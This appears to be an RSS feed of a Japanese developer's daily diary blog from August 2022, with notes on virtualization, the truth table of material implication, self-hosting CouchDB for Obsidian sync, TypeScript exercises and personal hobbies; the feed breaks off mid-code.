&lt;li>準仮想化はホストOSの更に下のレイヤのハイパーバイザ上でゲストOSを稼働させる。ゲストOSのセンシティブなシステムコールは事前に書き換えられており、命令の代わりにハイパーバイザを呼び出す形になっている。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>準仮想化は処理速度がはやいものの、ゲストOS側がハードウェアについて詳しくないといけなかったりゲストOSの開発元の協力が必要。&lt;/li>
&lt;li>WSL2はハイパーバイザ上に軽量VMを用いて完全なLinuxカーネルを動作させている。
&lt;ul>
&lt;li>このlinuxカーネルはハイパーバイザの上にホストOSなしで直接のっているがセンシティブ命令を書き換えられているわけではない。&lt;/li>
&lt;li>センシティブなシステムコールはいったいどうやって処理してるんだ&amp;hellip;???&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>20220823</title><link>https://qwyng.dev/posts/20220823/</link><pubDate>Tue, 23 Aug 2022 23:10:00 +0900</pubDate><guid>https://qwyng.dev/posts/20220823/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>関数プログラミングの宿題に手を付けた。自然数ってなんなんだ。&lt;/li>
&lt;li>友達と昨日話していたラプラス株式会社の問題の答え合わせを行っていた。&lt;/li>
&lt;li>SmashlogTVのLOL部門がオーブンされていた。全人類見ろ&lt;/li>
&lt;/ul>
&lt;blockquote class="twitter-tweet">&lt;p lang="ja" dir="ltr">【🎊新チャンネル開設】&lt;br>&lt;br>本日、SmashlogTVはLoL部門をオープンしました！&lt;br>&lt;br>初心者向け攻略を中心に、徐々にプロの方々をお招きしながら競技シーンの魅力を発信していきます🔥&lt;br>&lt;br>新参者ですが、コミュニティの皆さま是非よろしくお願いします😊✨&lt;br>&lt;br>🔽チャンネルはこちら&lt;a href="https://t.co/KIK7AQTxVu">https://t.co/KIK7AQTxVu&lt;/a>&lt;a href="https://twitter.com/hashtag/LoL?src=hash&amp;amp;ref_src=twsrc%5Etfw">#LoL&lt;/a> &lt;a href="https://t.co/wT9AA6KgIN">pic.twitter.com/wT9AA6KgIN&lt;/a>&lt;/p>&amp;mdash; Smashlog@LoL (@Smashlog_LoL) &lt;a href="https://twitter.com/Smashlog_LoL/status/1561655448276647937?ref_src=twsrc%5Etfw">August 22, 2022&lt;/a>&lt;/blockquote> &lt;script async src="https://platform.twitter.com/widgets.js" charset="utf-8">&lt;/script>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>EC、特に在庫管理周りの設計に関する記事が世の中に数多くあり、toCを感じた。&lt;/li>
&lt;li>DB設計の記事だとこの記事は良かった。
&lt;ul>
&lt;li>&lt;a href="https://tech.tabechoku.com/entry/2020/06/15/132518">https://tech.tabechoku.com/entry/2020/06/15/132518&lt;/a>&lt;/li>
&lt;li>三角関係のリレーションはなるべく作らないというのは確かに便利指針。実質第三正規化みたいなものな気がする。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>0が自然数であり、その他の自然数は0の後継(successor)
&lt;ul>
&lt;li>&lt;code>0 s(0) s(s(0))&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>20220822</title><link>https://qwyng.dev/posts/20220822/</link><pubDate>Mon, 22 Aug 2022 23:43:37 +0900</pubDate><guid>https://qwyng.dev/posts/20220822/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>昨日に続いてラプラス株式会社の問題を見ていた。結構面倒。&lt;/li>
&lt;li>バターをもらった&lt;/li>
&lt;li>先日外出した際にレガシーのデッキを店に忘れる大ポカをやらかしていたので、回収しに向かった。&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>日本は治安がいい&lt;/li>
&lt;/ul></description></item><item><title>日記とP⇒Qの真理値の理由</title><link>https://qwyng.dev/posts/20220821/</link><pubDate>Sun, 21 Aug 2022 23:51:41 +0900</pubDate><guid>https://qwyng.dev/posts/20220821/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>友人と&lt;a href="https://github.com/lapras-inc/exam-swe-template">LAPRAS株式会社さんのスキルチェック課題&lt;/a>に挑戦してみようぜと持ちかけられたので挑戦してみた。
&lt;ul>
&lt;li>データベース設計の問題だけでもいろいろ仕様があってなかなかボリューミーだなと感じた。これをちゃんと課題として取り組んでいるのはすごい。&lt;/li>
&lt;li>友人と回答を話し合うのは楽しみ。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;a href="https://www.iwanami.co.jp/book/b496835.html">まったくのゼロからの論理学&lt;/a>を引き続き読んでいる。今回は論理記号と論理式の章を読んだのだが意味分からんところがあったのでちょっと調べものをした。&lt;/li>
&lt;/ul>
&lt;h3 id="pqの真理表の理由">P⇒Qの真理表の理由
&lt;span>&lt;a href="#pq%e3%81%ae%e7%9c%9f%e7%90%86%e8%a1%a8%e3%81%ae%e7%90%86%e7%94%b1">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>条件法の真理表については本を読む前から納得がいっていなかった。
特に前件が偽だった場合になぜ真になるのか全くわからなかった。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>P&lt;/th>
&lt;th>Q&lt;/th>
&lt;th>P⇒Q&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;td>１&lt;/td>
&lt;td>１&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>1&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>0&lt;/td>
&lt;td>0&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>例をあげて説明する。&lt;/p>
&lt;p>&lt;strong>R FakerがAzirをプレイするならばFakerの所属するチームは勝利する。&lt;/strong>&lt;br>
という条件文の真理値を考える。&lt;/p>
&lt;ol>
&lt;li>FakerはAzirをプレイした。Fakerの所属するチームは勝利した。&lt;/li>
&lt;li>FakerはAzirをプレイした。Fakerの所属するチームは勝利しなかった。&lt;/li>
&lt;li>FakerはAzirをプレイしていない。Fakerの所属するチームは勝利した。&lt;/li>
&lt;li>FakerはAzirをプレイしていない。Fakerの所属するチームは勝利しなかった。&lt;/li>
&lt;/ol>
&lt;p>1の場合条件文は真だ。2の場合Rは偽だ。これは直感的にわかった。
3,４はそれだけではRが偽なのか真なのかは断定できない。しかし真理表においてははっきりと3も4も真であるとされている。そこがわからなかった。&lt;/p>
&lt;p>色々調べてみると一つ資料をみつけた。&lt;br>
&lt;a href="https://www.is.nagoya-u.ac.jp/dep-ss/phil/kukita/others/Logic-of-Conditionals.pdf">https://www.is.nagoya-u.ac.jp/dep-ss/phil/kukita/others/Logic-of-Conditionals.pdf&lt;/a>&lt;/p>
&lt;p>この資料によると前件と後件に同じ変数がある条件文を形式含意と呼ぶらしく、形式含意が真であるのは変数にいかなる数字を入れたときも真であるときだけであるという定義がある。
逆説的だが&lt;br>
&lt;code>Xが4の倍数ならXは2の倍数である&lt;/code>が真であるので&lt;br>
&lt;code>5が4の倍数ならば5は2の倍数である&lt;/code>という命題も真でなくてはならないのだ。&lt;/p>
&lt;p>つまり上の真理表4の場合においては&lt;br>
&lt;code>Xが10の倍数ならXは5の倍数である&lt;/code>&lt;br>
この命題のXに5を当てはめると&lt;br>
&lt;code>11が10の倍数ならば11は5の倍数である。&lt;/code>&lt;br>
となる。&lt;br>
このときPもQも偽だ。しかし「Xが4の倍数ならXは2の倍数である」は偽ではなく真である。
よって真偽の組み合わせが同じである4の場合もRは真であるとなる。おなじP⇒Qという命題でPとQの真理値の組み合わせ同じならば絶対に真理値は同じ。P⇒QとP⇒Qは同値でなくてはならないのだ。&lt;br>
つぎに3の場合について考えてみる。&lt;br>
&lt;code>5が4の倍数ならば2は偶数である&lt;/code>は真なのか？&lt;br>
色々調べたところ、これは&lt;a href="https://ja.wikipedia.org/wiki/%E9%81%A9%E5%88%87%E3%81%95%E3%81%AE%E8%AB%96%E7%90%86">実質含意のパラドクス&lt;/a>と呼ばれているらしい。&lt;code>2は偶数である&lt;/code>が真のとき&lt;code>5が4の倍数ならば2は偶数である&lt;/code>というのは真である。なぜなら5が4の倍数であってもなくても2は偶数であるからである。Qであるというのが絶対に真ならP⇒Qを偽とすることは絶対にできず古典論理において命題は真か偽のどちらかであるからであるので真にするしかないのである。 僕たちが日本語で用いる「ならば」に期待する因果関係というのは古典論理ではまったく考慮しないらしい。&lt;/p>
&lt;p>総合して古典論理ではP⇒Qというのが偽であるのはPが真でQが偽であるときのみであり、
P⇒Qが真であるのは「Qが真」または「Qが偽かつPが偽」のときのみと言えるらしい。&lt;br>
そしてこの真理値の土台となっている考え方は、P⇒QとP⇒Qは同値であるという&lt;a href="https://ja.wikipedia.org/wiki/%E5%A4%96%E5%BB%B6%E6%80%A7%E3%81%AE%E5%85%AC%E7%90%86">外延性の公理&lt;/a>とP⇒Qは真か偽のどちらかであるという二値原理の２つである。
この古典論理の直感的に変な真理値をなんとかするために厳密含意とか色々研究されているらしい。&lt;/p></description></item><item><title>20220820</title><link>https://qwyng.dev/posts/20220820/</link><pubDate>Sun, 21 Aug 2022 00:55:23 +0900</pubDate><guid>https://qwyng.dev/posts/20220820/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>パイオニアの大会に赤単で出場した。結果は3-2&lt;/li>
&lt;li>友達と寿司を食べて最高になった。
&lt;img src="https://lh3.googleusercontent.com/HPJWpy38W0COUcrB-U6c-EoQ_qfvCnEWBFqeVP2Tg7VmSuSjNhgvHynpZQVrLo36PFCePwH4Fro7Cdjr_Iv_2dI1JJ_b81FpYtUaXAbzP0ucExIlrGiO8LXGQ9EDwvYHemz8t7c1RA=w2400" alt="">&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>コントロール相手には棘平原抜いて良い&lt;/li>
&lt;li>夏とは言え服はただのシャツだと下着みたいに見えるらしい&lt;/li>
&lt;/ul></description></item><item><title>20220819</title><link>https://qwyng.dev/posts/20220819/</link><pubDate>Fri, 19 Aug 2022 22:44:39 +0900</pubDate><guid>https://qwyng.dev/posts/20220819/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>関数プログラミングの課題を終わらせた。偉い&lt;/li>
&lt;li>マッサマンカレーを作った。OC&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>日記が一日空いてしまった。&lt;/li>
&lt;/ul></description></item><item><title>20220818</title><link>https://qwyng.dev/posts/20220818/</link><pubDate>Thu, 18 Aug 2022 22:48:42 +0900</pubDate><guid>https://qwyng.dev/posts/20220818/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>関数プログラミングの課題を2/3終わらせた。偉い。教授から二分で提供のメールの返信がきた。即レス見習っていきたい。&lt;/li>
&lt;li>メディカルメイクというものを体験した。
&lt;ul>
&lt;li>&lt;a href="https://www.medical-makeup.net/medical-makeup">メディカルメイクアップとは｜メディカルメイクアップアソシエーション(MMA)&lt;/a>
&lt;ul>
&lt;li>顔の左に薄めで広めのしみっぽいのがありコンプレックスだったので試してみた。&lt;/li>
&lt;li>ファンデーションを使うと本当に自然にしみがなくなった。しかも手間もさほどかからなかったので化粧品のパワーを感じた。&lt;/li>
&lt;li>アドバイス等は無料で肌色に合わせた化粧品を有料で購入する形式なのだが、化粧品の値段も普通だった。&lt;/li>
&lt;li>アドバイスがめちゃくちゃ丁寧なうえに一から自分で全部やる演習もできるので満足度が高かった。非営利団体らしいがどうやって運営してるんだ！？&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>人生で生まれて始めてファンデーションをつけた。色付きの油を粉で顔に固定するらしい。クレンジングオイルってなんでオイルなのかよくわかってなかったが、油じゃないと粉で固定された油が落とせないらしい。&lt;/li>
&lt;li>いざ化粧で隠せるとなると化粧しないで人前にでるのが怖くなってしまった。また1つ人間の感情を知ってしまった&amp;hellip;。&lt;/li>
&lt;/ul></description></item><item><title>20220817</title><link>https://qwyng.dev/posts/20220817/</link><pubDate>Wed, 17 Aug 2022 20:22:49 +0900</pubDate><guid>https://qwyng.dev/posts/20220817/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>Macを取り返そうな雰囲気を感じ、これを機にメモアプリを見直そうと考えObsidianを使い始めた。
&lt;ul>
&lt;li>私生活はWindowsで仕事はMacと使い分けているので同期は必須。あとScrapBoxみたいにリンクが集まっていい感じになってほしかった。&lt;/li>
&lt;li>じゃあScrapBoxでええじゃんということなのだがブラウザの挙動の中で文章を書くのはなかなか面倒だし、アプリの切り替えでメモアプリに遷移したいのでタブの中に埋もれるScrapBoxは候補から外した。&lt;/li>
&lt;li>Obsidian公式が提供してるSync機能が月10$で高すぎてひっくり返ってしまったので&lt;a href="https://github.com/vrtmrz/obsidian-livesync">有志が提供してるself-hostでcouchdbを使って同期するPlugin&lt;/a>を導入した。公式のPluginストアに存在したので公式が認めないような拡張ではなさそう。&lt;/li>
&lt;li>導入に結構時間がかかってしまった。僕のインフラ力が足りない。手順は以下
&lt;ul>
&lt;li>couchdbはオフィシャルのDocker imageがあるのでそれを使ってgcpのインスタンスで稼働させた。このとき専用の設定が必要らしいのでPluginのドキュメントをチェックすること。ボリュームの設定も忘れずに（1敗)&lt;/li>
&lt;li>Aレコードをいい感じに登録する。&lt;/li>
&lt;li>インスタンスの中でnginxとcertbotを使って証明書を取得。&lt;/li>
&lt;li>nginxを443待ちで起動してcouchdb備え付けのwebサーバーへのリバースプロキシにする。&lt;a href="https://docs.couchdb.org/en/stable/best-practices/reverse-proxies.html#reverse-proxying-with-nginx">proxy_bufferingを切らないとcouchdbの連続レプリケーションが動かないらしい&lt;/a>。(1敗)&lt;/li>
&lt;li>Pluginの設定でURL指定してドン！&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>certbotをDocker内のnginxと組み合わせるのは面倒。&lt;a href="https://paulownia.hatenablog.com/entry/2020/09/12/150658">結局Docker Composeでなんかいい感じに連携させて証明書を取得した&lt;/a>。&lt;/li>
&lt;li>WindowsやMacとLinuxではDocke Composeのコマンドが違う。前者では&lt;code>docker-compose&lt;/code>だが後者では&lt;code>docker compose&lt;/code>。VMの上にDockerのっけてる関係なのかcomposeがdocker cliの中に搭載されていないっぽい？&lt;/li>
&lt;/ul></description></item><item><title>20220816</title><link>https://qwyng.dev/posts/20220816/</link><pubDate>Tue, 16 Aug 2022 23:28:21 +0900</pubDate><guid>https://qwyng.dev/posts/20220816/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>大学院の課題をやった。1/3終わった。&lt;/li>
&lt;li>実家から帰ってきた。うなぎを食べさせてくれた親に感謝します。&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>パターンマッチを使った関数型プログラミングっぽいのをずっと課題でやっているのは少しは感覚がみについてきたかもしれない。引数の具体的な値によってループを止めたりスタックを積んだり無限リストを表現したりプログラミングというのは奥が深い。&lt;/li>
&lt;/ul></description></item><item><title>20220815</title><link>https://qwyng.dev/posts/20220815/</link><pubDate>Mon, 15 Aug 2022 21:08:47 +0900</pubDate><guid>https://qwyng.dev/posts/20220815/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>色々あって住民票印刷したりした。偉い！&lt;/li>
&lt;li>色々あってRubyKaigiに参戦決定した。三年前は言ってること半分わからなかったが今回はわかるやろ！&lt;/li>
&lt;li>実家に帰ってきた。母親と話しているとまじでいきなり関係のない話ぶちこんでくるので、俺のコミュニケーション方法は親譲りだということがわかった。&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>今テレビで20~30代をターゲットにしているドラマは22時スタートらしい。昔は21時スタートだったが、今は21時スタートは刑事ドラマ等想定年齢層が高めの番組が多いらしい。&lt;/li>
&lt;li>&lt;a href="https://inside.estie.co.jp/entry/2022/08/15/153357">https://inside.estie.co.jp/entry/2022/08/15/153357&lt;/a>
&lt;ul>
&lt;li>面白かった。estieにすごいRubyエンジニアがいるらしい（）&lt;/li>
&lt;li>変数に違う型再代入したりするとLBBVの最適化の恩恵には与れなさそうなので気をつけていきたいですね。CPUとかの話でもこの分岐の片方を実行する前提でスケジューリングするみたいなのはよく聞くけど本当に人類の叡智って感じする。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul></description></item><item><title>20220814</title><link>https://qwyng.dev/posts/20220814/</link><pubDate>Sun, 14 Aug 2022 20:54:16 +0900</pubDate><guid>https://qwyng.dev/posts/20220814/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>大学院の課題をやった。これ８月末までに全部終わるかな&amp;hellip;。&lt;/li>
&lt;li>タブレットを盛大に割ってしまった。悲しい。&lt;/li>
&lt;li>スマホも四国で落としてから調子悪いし悲しい。&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>cafeobjの組み込みモジュールNATには-も/も%も演算子として実装されていない&lt;/li>
&lt;/ul></description></item><item><title>20220813</title><link>https://qwyng.dev/posts/20220813/</link><pubDate>Sat, 13 Aug 2022 11:06:59 +0900</pubDate><guid>https://qwyng.dev/posts/20220813/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>アジャイルサムライを読み終えた&lt;/p>
&lt;/li>
&lt;li>
&lt;p>夏休みの課題を確認した。簡単な言語のパーサーやコンパイラを作るといった課題の中に「人間は自然数を理解しているかどうか自分の意見を書け」という課題が出ててひっくり返った。僕は自然数理解していないので理解していません。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>駅前でパンケーキ食べた
&lt;img src="https://github.com/QWYNG/images/blob/main/PXL_20220813_052429250.jpg?raw=true" alt="">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>アジャイルサムライではこの一節が良かった。&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>うまくいかないときの根本原因は、感情に起因していること が多いものだ。 おそらくは、 お前が実現したいと思っている 方向とは正反対の向きに引っ張る力が作用しておるのだ。 お前が 立ち回る 相手 は、お前のやり方への抵抗それ自体ではない。 その背後にある精神構造だ。
ＪｏｎａｔｈａｎＲａｓｍｕｓｓｏｎ; 西村直人; 角谷信太郎. アジャイルサムライ――達人開発者への道 (p.329). オーム社. Kindle 版.
&lt;/code>&lt;/pre>&lt;p>仕事において感情って邪魔だと思うことが多々あるのだけれど多分ここで言ってる精神構造のことだと思う。感情だなんて曖昧な言い方しないで構造を考えるのが大事ですね。
本のまとめとしては常に考え続けていろんなことを試して良いプロダクトを顧客に届けろということだった。テスト書いたりスコープしぼったり変化を見極めたりしてけ。&lt;/p></description></item><item><title>20220812</title><link>https://qwyng.dev/posts/20220812/</link><pubDate>Fri, 12 Aug 2022 23:43:07 +0900</pubDate><guid>https://qwyng.dev/posts/20220812/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>wslでRubymineを使えるようにした。&lt;/li>
&lt;li>アジャイルサムライを第四部まで読んだ&lt;/li>
&lt;li>LOLをした&lt;/li>
&lt;/ul>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;ul>
&lt;li>
&lt;p>ちゃんと動くソフトウェアをつくって顧客へ信頼貯金をしていけ&lt;/p>
&lt;/li>
&lt;li>
&lt;p>公共事業系システムの開発に対して例え炎上していても変化をトラッキングして後は自分の頭で考えて動けというコラムがわりと雑で笑ってしまった。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;li>
&lt;p>LOLをしてはいけない&lt;/p>
&lt;/li>
&lt;/ul></description></item><item><title>20220811</title><link>https://qwyng.dev/posts/20220811/</link><pubDate>Thu, 11 Aug 2022 23:01:03 +0900</pubDate><guid>https://qwyng.dev/posts/20220811/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>チェンソーマンを読んだ。エロとグロという感じ。
LOLもたくさんやった。もう二度とやらない。&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>アジャイルサムライを読みすすめた。8章まで読んだ。
プロジェクトの成功ってなんなんだ。&lt;/p></description></item><item><title>20220810</title><link>https://qwyng.dev/posts/20220810/</link><pubDate>Wed, 10 Aug 2022 22:09:22 +0900</pubDate><guid>https://qwyng.dev/posts/20220810/</guid><description>&lt;h2 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>MTG!
3-3 ラクドスに勝てん！&lt;/p>
&lt;h2 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h2>&lt;p>ラクドスに勝てん！&lt;/p></description></item><item><title>20220809</title><link>https://qwyng.dev/posts/20220809/</link><pubDate>Tue, 09 Aug 2022 20:09:10 +0900</pubDate><guid>https://qwyng.dev/posts/20220809/</guid><description>&lt;h3 id="やったこと">やったこと
&lt;span>&lt;a href="#%e3%82%84%e3%81%a3%e3%81%9f%e3%81%93%e3%81%a8">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>カーペットに掃除機かけてトイレとキッチンの排水口を掃除した。偉い。あとたくさん燃えるゴミを出した。偉い。&lt;/p>
&lt;h3 id="学び">学び
&lt;span>&lt;a href="#%e5%ad%a6%e3%81%b3">#&lt;/a>&lt;/span>
&lt;/h3>&lt;p>手を動かしながら学ぶTypeScriptを読み終えた。
本当に結構手を動かせたので満足。&lt;/p>
&lt;p>最後の２つの課題の例は以下のようにした。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#75715e">// Buttonコンポーネントにdisabledをつける
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">export&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">Button&lt;/span>: &lt;span style="color:#66d9ef">VFC&lt;/span>&amp;lt;&lt;span style="color:#f92672">Props&lt;/span>&amp;gt; &lt;span style="color:#f92672">=&lt;/span> ({
&lt;span style="color:#a6e22e">title&lt;/span>,
&lt;span style="color:#a6e22e">onClick&lt;/span>,
&lt;span style="color:#a6e22e">width&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>,
&lt;span style="color:#66d9ef">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;primary&amp;#39;&lt;/span>,
&lt;span style="color:#a6e22e">disabled&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>
}) &lt;span style="color:#f92672">=&amp;gt;&lt;/span> {
&lt;span style="color:#66d9ef">return&lt;/span> (
&amp;lt;&lt;span style="color:#f92672">Wrapper&lt;/span> &lt;span style="color:#a6e22e">onClick&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#a6e22e">onClick&lt;/span>} &lt;span style="color:#a6e22e">width&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#a6e22e">width&lt;/span>} &lt;span style="color:#a6e22e">className&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#66d9ef">type&lt;/span>} &lt;span style="color:#a6e22e">disabled&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#a6e22e">disabled&lt;/span>}&amp;gt;
{&lt;span style="color:#a6e22e">title&lt;/span>}
&amp;lt;/&lt;span style="color:#f92672">Wrapper&lt;/span>&amp;gt;
)
}
&lt;span style="color:#75715e">// 使用例
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&amp;lt;&lt;span style="color:#f92672">Button&lt;/span> &lt;span style="color:#a6e22e">onClick&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{() &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">onSubmit&lt;/span>(&lt;span style="color:#a6e22e">value&lt;/span>)} &lt;span style="color:#a6e22e">title&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;実行&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">disabled&lt;/span>&lt;span style="color:#f92672">=&lt;/span>{&lt;span style="color:#a6e22e">isError&lt;/span>(&lt;span style="color:#a6e22e">value&lt;/span>.&lt;span style="color:#a6e22e">length&lt;/span>)}/&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-typescript" data-lang="typescript">&lt;span style="color:#75715e">// PasswordFormのonSubmitの型を(password: string) =&amp;gt; Promise&amp;lt;T&amp;gt;にする
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
